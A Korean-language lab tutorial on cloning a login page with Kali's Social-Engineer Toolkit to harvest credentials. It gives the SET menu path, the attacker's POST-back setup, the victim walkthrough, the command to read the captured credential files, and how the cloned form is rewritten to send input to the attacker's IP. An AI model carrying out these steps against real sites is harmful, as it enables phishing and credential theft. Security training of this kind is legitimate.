실전 사이트 클로닝 및 정보 탈취 실습 가이드 (Site Cloning & Credential Harvesting)
본 교재는 칼리 리눅스(Kali Linux)에 내장된 **Social-Engineer Toolkit (SET)**을 활용하여 실제 웹 사이트를 복제하고, 사용자가 입력한 정보를 가로채는 과정을 단계별로 설명합니다. 모든 실습은 가상 환경(Metasploitable 2 등) 내에서만 진행하십시오.
1. 사전 준비 및 환경 설정 (Environment Setup)
공격자 서버(Kali)와 피해자 클라이언트(Windows/Ubuntu)가 동일한 네트워크에 있어야 합니다.
 * 공격자 IP 확인: ifconfig 명령어로 Kali의 IP를 확인합니다. (예: 192.168.10.10)
 * Apache 서비스 확인: SET은 자체 웹 서버를 구동하므로 기존 80번 포트 서비스가 중지되어 있어야 합니다.
   sudo systemctl stop apache2

2. SET (Social-Engineer Toolkit) 실행 및 모듈 설정
칼리 리눅스 터미널에서 다음 순서대로 번호를 입력하여 설정을 진행합니다.
 * SET 실행: sudo setoolkit 입력
 * 메뉴 선택 1: 1) Social-Engineering Attacks (사회공학적 공격)
 * 메뉴 선택 2: 2) Website Attack Vectors (웹사이트 공격 벡터)
 * 메뉴 선택 3: 3) Credential Harvester Attack Method (자격 증명 수집 방법)
 * 메뉴 선택 4: 2) Site Cloner (사이트 복제)
3. 사이트 복제 및 서버 가동 (Cloning Process)
모듈을 선택하면 구체적인 정보를 입력하라는 메시지가 나타납니다.
 * IP 주소 설정 (IP address for the POST back):
   * 정보를 전송받을 공격자(Kali)의 IP를 입력합니다. (기본값으로 본인 IP가 출력되면 Enter)
 * 복제할 URL 입력 (Enter the URL to clone):
   * 복사하고자 하는 실제 로그인 페이지 주소를 입력합니다.
   * 예: http://192.168.10.20/dvwa/login.php (실습용 타겟)
> 주의: Cloning the website... 메시지가 나온 후 The Social-Engineer Toolkit is now listening on 0.0.0.0:80이 뜨면 공격 서버가 활성화된 것입니다.
> 
4. 피해자 브라우저 접속 및 정보 입력 (Execution)
이제 피해자(Client) 입장에서 공격자가 만든 가짜 사이트에 접속하는 단계입니다.
 * 브라우저 실행: 피해자 PC에서 웹 브라우저를 엽니다.
 * 주소 입력: 공격자(Kali)의 IP 주소(http://192.168.10.10)를 입력하고 접속합니다.
 * 결과 확인: 주소창은 IP이지만, 화면 구성은 아까 입력한 원본 사이트와 100% 동일한 페이지가 나타납니다.
 * 정보 입력: 아이디(admin)와 비밀번호(password123)를 입력하고 'Login' 버튼을 클릭합니다.
5. 탈취된 정보 확인 방법 (Data Monitoring)
피해자가 버튼을 누르는 순간, 공격자의 Kali 터미널에는 실시간으로 데이터가 기록됩니다.
 * 터미널 실시간 로그:
   * 사용자가 로그인을 시도하면 SET 터미널에 **"POSSIBLE USERNAME/PASSWORD FOUND!"**라는 메시지가 빨간색으로 강조되며 출력됩니다.
 * 파일로 확인:
   * 수집된 정보는 /var/www/html/ 경로 내에 텍스트 파일(예: harvester_XXXX.txt)로 자동 저장됩니다.
   cat /var/www/html/harvester_*.txt

6. 입력 정보가 보이는 원리 (Technical Analysis)
SET의 Site Cloner는 단순히 HTML만 가져오는 것이 아니라, 내부 코드를 다음과 같이 수정합니다.
 * <form> 태그 변조: 원본의 action="login_check.php"를 action="http://공격자IP/"로 강제 수정합니다.
 * 데이터 가로채기: 사용자가 전송(Submit) 버튼을 누르면 데이터가 원본 서버가 아닌 공격자의 수집 스크립트로 먼저 전달됩니다.
 * 정상 리다이렉션: 정보를 저장한 후, 사용자를 다시 진짜 원본 사이트로 보내버리기 때문에 피해자는 해킹당했다는 사실을 인지하기 어렵습니다.
